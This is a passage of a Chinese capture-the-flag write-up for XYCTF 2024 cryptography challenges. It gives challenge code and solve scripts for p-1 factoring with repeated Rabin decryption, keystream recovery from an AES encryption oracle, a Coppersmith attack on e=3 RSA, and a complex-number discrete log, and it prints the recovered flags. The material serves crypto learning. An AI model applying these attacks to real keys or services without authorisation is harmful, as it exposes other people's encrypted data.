class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs 1c">n = <span class="hljs-number">39332423872740210783246069030855946244104982381157166843977599780233911183158560901377359925435092326653303964261550158658551518626014048783435245471536959844874036516931542444719549997971482644905523459407775392702211086149279473784796202020281909706723380472571862792003687423791576530085747716706475220532321</span><br><br><span class="hljs-meta"># decode: 利用 p-1 光滑攻击分解出 p,q</span><br>from gmpy2 import *<br>a = <span class="hljs-number">2</span><br>N = n<br>n = <span class="hljs-number">2</span><br>while True:<br>    a = powmod(a, n, N)<br>    res = gcd(a-<span class="hljs-number">1</span>, N)<br>    if res != <span class="hljs-number">1</span> and res != N:<br>        q = N <span class="hljs-comment">// res</span><br>        print(res*q==N)<br>        print('p=',res)<br>        print('q=',q)<br>        break<br>    n += <span class="hljs-number">1</span><br>'''<br>True<br>p= <span class="hljs-number">23643840047752</span><span class="hljs-number">15979229504451</span><span class="hljs-number">53796265199072</span><span class="hljs-number">40457718319095</span><span class="hljs-number">31148051705228</span><span class="hljs-number">75904551780358</span><span class="hljs-number">33876944055881</span><span class="hljs-number">63511052537949</span><span class="hljs-number">64040981919231</span><span class="hljs-number">48409809767108</span><span class="hljs-number">48953022874254</span>79<br>q= <span class="hljs-number">16635378937305</span><span class="hljs-number">73521952685751</span><span class="hljs-number">68397750362643</span><span class="hljs-number">82220125350894</span><span class="hljs-number">10528359454206</span><span class="hljs-number">24983216456266</span><span class="hljs-number">47817657965149</span><span class="hljs-number">00806969738496</span><span class="hljs-number">07356408696043</span><span class="hljs-number">71849249999306</span><span class="hljs-number">28634154245781</span>99<br>'''<br></code></pre></td></tr></table></figure><p>得到p,q后，就可以求出e</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">y = 1813650001270967709841306491297716908969425248888510985109381881270362755031385564927869313112540534780853966341044526856705589020295048473305762088786992446350060024881117741041260391405962817182674421715239197211274668450947666394594121764333794138308442124114744892164155894256326961605137479286082964520217<br>p= 236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479<br>q= 166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199<br><span class="hljs-built_in">print</span>(<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">d</span>=inverse(65537,(p-1)*(q-1))<br><span class="hljs-built_in">print</span>(long_to_bytes(pow(y,d,n)))<br><span class="hljs-comment">#b'XYCTF{e==4096}'</span><br></code></pre></td></tr></table></figure><p>很明显e=<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewbox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"/></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"/></g></g></g></g></g></svg></mjx-container>,采用多轮rabin攻击</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vim">from Crypto.Util.<span class="hljs-keyword">number</span> import *<br><span class="hljs-keyword">e</span>=<span class="hljs-number">4096</span><br><span class="hljs-keyword">c</span> = <span class="hljs-number">16938927825234407267026017561045490265698491840814929432152839745035946118743714566623315033802681009017695526374397370343984360997903165842591414203197184946588470355728984912522040744691974819630118163976259246941579063687857994193309554129816268931672391946592680578681270693589911021465752454315629283033043</span><br><span class="hljs-keyword">p</span>= <span class="hljs-number">236438400477521597922950445153796265199072404577183190953114805170522875904551780358338769440558816351105253794964040981919231484098097671084895302287425479</span><br>q= <span class="hljs-number">166353789373057352195268575168397750362643822201253508941052835945420624983216456266478176579651490080696973849607356408696043718492499993062863415424578199</span><br><br>def repeat_rabin(<span class="hljs-keyword">x</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q):<br>    n = <span class="hljs-keyword">p</span> * q<br>    x0=gmpy2.<span class="hljs-built_in">invert</span>(<span class="hljs-keyword">p</span>,q)<br>    x1=gmpy2.<span class="hljs-built_in">invert</span>(q,<span class="hljs-keyword">p</span>)<br>    <span class="hljs-keyword">cs</span> = [<span class="hljs-keyword">c</span>]<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-keyword">x</span>):<br>        <span class="hljs-keyword">ps</span> = []<br>        <span class="hljs-keyword">for</span> c2 in <span class="hljs-keyword">cs</span>:<br>            r = <span class="hljs-built_in">pow</span>(c2, (<span class="hljs-keyword">p</span> + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, <span class="hljs-keyword">p</span>)<br>            s = <span class="hljs-built_in">pow</span>(c2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>            <span class="hljs-keyword">x</span> = (r * x1 * q + s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">y</span> = (r * x1 * q - s * x0 * <span class="hljs-keyword">p</span>) % n<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">x</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">x</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">y</span>)<br>            <span class="hljs-keyword">if</span> n - <span class="hljs-keyword">y</span> not in <span class="hljs-keyword">ps</span>:<br>                <span class="hljs-keyword">ps</span>.<span class="hljs-keyword">append</span>(n - <span class="hljs-keyword">y</span>)<br>        <span class="hljs-keyword">cs</span> = <span class="hljs-keyword">ps</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">cs</span><br><span class="hljs-keyword">ps</span>=repeat_rabin(<span class="hljs-number">12</span>,<span class="hljs-keyword">e</span>,<span class="hljs-keyword">p</span>,q)<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">m</span> in <span class="hljs-keyword">ps</span>:<br>    <span class="hljs-keyword">print</span>(long_to_bytes(<span class="hljs-keyword">m</span>))<br><br></code></pre></td></tr></table></figure><img src="/2024/04/29/XYCTF2024WP/image-20240401222652666.png" class title="image-20240401222652666"><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">import</span> os<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">"flag.txt"</span>, <span class="hljs-string">"rb"</span>).read()<br>key = os.urandom(<span class="hljs-number">16</span>)<br>iv = os.urandom(<span class="hljs-number">16</span>)<br>flag = pad(flag, <span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_encrypt</span>(<span class="hljs-params">key, plaintext</span>):<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-keyword">return</span> cipher.encrypt(plaintext)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">key, plaintext, iv</span>):<br>    ciphertext = <span class="hljs-string">b""</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), AES.block_size):<br>        key_block = aes_encrypt(key, iv)<br>        ciphertext_block = <span class="hljs-built_in">bytes</span>(<br>            [plaintext[i + j] ^ key_block[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(AES.block_size)]<br>        )<br>        ciphertext += ciphertext_block<br>        iv = key_block<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"1.print\n2.input\n3.exit"</span>)<br>        a = <span class="hljs-built_in">input</span>(<span class="hljs-string">"&gt; "</span>)<br>        <span class="hljs-keyword">if</span> a == <span class="hljs-string">"1"</span>:<br>            <span class="hljs-built_in">print</span>((iv + encrypt(key, flag, iv)).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">"2"</span>:<br>            ivs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">"iv: "</span>))<br>            inputs = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">"message: "</span>))<br>            <span class="hljs-built_in">print</span>(encrypt(key, inputs, ivs).<span class="hljs-built_in">hex</span>())<br>        <span class="hljs-keyword">elif</span> a == <span class="hljs-string">"3"</span>:<br>            exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"You need input 1,2,3"</span>)<br>    <span class="hljs-keyword">except</span>:exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>分析代码可知，加密过程是异或操作，每一轮的密钥由上一轮的iv经过AES的ECB模式加密得到，加密的key未知。</p><p>题目两个功能，1选项，给出初始iv和加密后的flag密文，暂时不知道如何解密，缺少key或者每轮的key_block,2选项，输入iv和一个明文，得到其加密后的密文。</p><p>关键点在这里，已知明文密文，加密过程是异或，能否求出key_block。但key_block是AES加密的，由key和iv得到，key全程未知，初始iv已知，故不可能我们正向得到key_block，那么能否逆向得到加密后的key_block呢？</p><p>这里选择2允许我们自定义加密明文和密文，我们可以令ivs为初始iv，那么两次加密过程的每轮key_block一样，故先输入1，获取初始iv和flag_c，再输入2，令两次初始iv相同，根据得到的明文密文求出每轮key_block，再求解。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">flag_c</span>=<span class="hljs-string">'600106b927db260469a566518b6e64aa69018fcbed26078a3f7df0108be6f753d67bda6bf16dbf1de6ebe8c1aa134abe3ef6c0b1ccc140f5ff08a86a1a04afc5'</span><br><br><span class="hljs-attribute">flag_c</span>=bytes.fromhex(flag_c)<br>flag_iv,<span class="hljs-attribute">flag_c</span>=flag_c[:16],flag_c[16:]<br><br><span class="hljs-attribute">iv</span>=flag_iv.hex()<br><span class="hljs-attribute">iv</span>=bytes.fromhex(iv)<br><span class="hljs-attribute">m</span>=iv*3<br><span class="hljs-attribute">c</span>=<span class="hljs-string">'5159ca268c8611b960bea22262bfbe9c834db9ffe2d5ae2ca22fbca240501c766ac7a26edd785497a59eb331956ecf6b'</span><br><span class="hljs-attribute">c</span>=bytes.fromhex(c)<br><br><br><span class="hljs-attribute">iv_c</span>=bytes(c[i]^m[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(16<span class="hljs-number">*3</span>))<br><span class="hljs-attribute">c</span>=b''<br>key_block = iv_c<span class="hljs-number">*3</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,48,16):<br>    ciphertext_block = bytes(<br>        [flag_c[i+j] ^ key_block[i+j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(16)]<br>    )<br>    c += ciphertext_block<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment">#b'XYCTF{076f4cb7-e57e-4c75-a22a-2b40df6b2f33}\n\x04\x04\x04\x04'</span><br></code></pre></td></tr></table></figure><h3 id="反方向的密码-相思"><a href="#反方向的密码-相思" class="headerlink" title="反方向的密码 相思"></a>反方向的密码 相思</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hash</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> hashlib.sha256(x.encode()).digest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">message</span>):<br>    <span class="hljs-keyword">return</span> message + <span class="hljs-built_in">hash</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(message)))<br><br><br>m = bytes_to_long(pad(flag))<br>p = getStrongPrime(<span class="hljs-number">512</span>)<br>q = getStrongPrime(<span class="hljs-number">512</span>)<br>n = p * q<br>e = <span class="hljs-number">3</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m, e, n))<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment"># 120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br><span class="hljs-comment"># 143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br><br></code></pre></td></tr></table></figure><p>代码很简单就是个RSA加密，但生成的素数是强素数，无法分解，注意到e=3,想到低加密指数攻击，但开方出来不对，可能是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.92ex" height="1.553ex" role="img" focusable="false" viewbox="0 -675.5 1290.5 686.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g><g data-mml-node="mi" transform="translate(911,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/></g></g></g></g></svg></mjx-container>&gt;n,尝试爆破k，还是没能求解。仔细观察，发现明文经过hash填充，仔细想想，一个flag内容算10个字符内容吗，加上XYCTF{},有17 * 8 =136位，加上填充256位，再3次方有1176位，k就有100多位大小，不太可能爆破出来。又尝试能否有限域开方，失败。</p><p>仔细观察代码。这里不是对flag内容的hash填充，而是对长度，因此一个flag长度再怎么也在100以内，故填充内容可以爆破得知。现在已知明文低位，以及明文部分高位，尝试coppersmith求中间位。这里，需要调整一下small_roots的参数。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">c=<span class="hljs-number">120440199294949712392334113337541924034371176306546446428347114627162894108760435789068328282135879182130546564535108930827440004987170619301799710272329673259390065147556073101312748104743572369383346039000998822862286001416166288971531241789864076857299162050026949096919395896174243383291126202796610039053</span><br>n=<span class="hljs-number">143413213355903851638663645270518081058249439863120739973910994223793329606595495141951165221740599158773181585002460087410975579141155680671886930801733174300593785562287068287654547100320094291092508723488470015821072834947151827362715749438612812148855627557719115676595686347541785037035334177162406305243</span><br>e = <span class="hljs-number">3</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>m0=bytes_to_long(b<span class="hljs-string">'XYCTF{'</span>)<br>m3=bytes_to_long(b<span class="hljs-string">'}'</span>)<br>def hash(x):<br>    a=hashlib.sha256(x.encode()).digest()<br>    <span class="hljs-keyword">return</span> a<br>num=<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>,<span class="hljs-number">47</span>):<br>    R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    m2=bytes_to_long(hash(str(i)))<br>    N=((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2)^e-c<br>    N=N.monic()<br>    m=N.small_roots(x=<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)), beta=<span class="hljs-number">1</span>, epsilon=<span class="hljs-number">0.05</span>)<br>    <span class="hljs-built_in">print</span>(i,(<span class="hljs-number">8</span>*(i<span class="hljs-number">-7</span>)),m)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-name">m</span>:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3))<br>        <span class="hljs-built_in">print</span>(long_to_bytes((m0*<span class="hljs-number">2</span>^(<span class="hljs-number">8</span>*(i<span class="hljs-number">-6</span>))+x*<span class="hljs-number">2</span>^<span class="hljs-number">8</span>+m3)*<span class="hljs-number">2</span>^num+m2))<br><span class="hljs-string">''</span><span class="hljs-string">'</span><br><span class="hljs-string">38 248 [58964190787951927773278389967057377362495121527440001979648729026891046689]</span><br><span class="hljs-string">b'</span>!__d3ng__hu0__1@n__3h@n__Chu__!}<span class="hljs-string">'</span><br><span class="hljs-string">b'</span>XYCTF{!__d3ng__hu0__1@n__3h@n__Chu__!}\xae\xa9!<span class="hljs-number">2</span>\xc4\xcb\xeb&amp;&gt;j\xc2\xbfl\x18;]\x81s\x7f\x17\x9f!\xef\xdcXcs\x96r\xf0\xf4p<span class="hljs-string">'</span><br><span class="hljs-string">'</span><span class="hljs-string">''</span><br></code></pre></td></tr></table></figure><h3 id="Complex-dlp"><a href="#Complex-dlp" class="headerlink" title="Complex_dlp"></a>Complex_dlp</h3><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python3">from Crypto.Util.number import *<br>from secrets import flag<br><br><br>class Complex:<br>    def __init__(self, re, im):<br>        self.re = re<br>        self.im = im<br><br>    def __mul__(self, c):<br>        re_ = self.re * c.re - self.im * c.im<br>        im_ = self.re * c.im + self.im * c.re<br>        return Complex(re_, im_)<br><br>    def __str__(self):<br>        if self.im == 0:<br>            return str(self.re)<br>        elif self.re == 0:<br>            if abs(self.im) == 1:<br>                return f"{'-' if self.im &lt; 0 else ''}i"<br>            else:<br>                return f"{self.im}i"<br>        else:<br>            return f"{self.re} {'+' if self.im &gt; 0 else '-'} {abs(self.im)}i"<br><br><br>def complex_pow(c, exp, n):<br>    result = Complex(1, 0)<br>    while exp &gt; 0:<br>        if exp &amp; 1:<br>            result = result * c<br>            result.re = result.re % n<br>            result.im = result.im % n<br>        c = c * c<br>        c.re = c.re % n<br>        c.im = c.im % n<br>        exp &gt;&gt;= 1<br>    return result<br><br><br>flag = flag.strip(b"XYCTF{").strip(b"}")<br>p = 1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>g = Complex(3, 7)<br>x = bytes_to_long(flag)<br>print(complex_pow(g, x, p))<br># 5699996596230726507553778181714315375600519769517892864468100565238657988087817 + 198037503897625840198829901785272602849546728822078622977599179234202360717671908i<br><br></code></pre></td></tr></table></figure><p>定义了一个复数类，flag为指数。考点在复数域下求离散对数，先将复数转换成实数，再求离散对数。</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">g=3^2+7^2<br>a,b=5699996596230726507553778181714315375600519769517892864468100565238657988087817 , 198037503897625840198829901785272602849546728822078622977599179234202360717671908<br>c=a^2+b^2<br>p=1127236854942215744482170859284245684922507818478439319428888584898927520579579027<br>from Crypto.Util.number import *<br>G=Zmod(p) <br>g=G(g) <br>c=G(c) <br>print(long_to_bytes(ZZ(discrete_log(c,g))))<br>#___c0mp13x_d1p_15_3@5y_f0r_y0u___<br></code></pre></td></tr></table></figure><h3 id="happy-to-solve2"><a href="#happy-to-solve2" class="headerlink" title="happy_to_solve2"></a>happy_to_solve2</h3><p>源码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">import random<br><span class="hljs-selector-tag">from</span> Crypto<span class="hljs-selector-class">.Util</span><span class="hljs-selector-class">.number</span> import *<br><span class="hljs-selector-tag">from</span> secrets import flag<br><br><br>def get_happy_prime():<br>    while <span class="hljs-number">1</span>:<br>        p = <span class="hljs-built_in">int</span>(<span class="hljs-string">""</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">"123"</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        q = <span class="hljs-built_in">int</span>(<span class="hljs-string">""</span>.<span class="hljs-built_in">join</span>([random.<span class="hljs-built_in">choice</span>(<span class="hljs-string">"567"</span>) for _ in <span class="hljs-built_in">range</span>(<span class="hljs-number">512</span>)]))<br>        if <span class="hljs-built_in">isPrime</span>(p) and <span 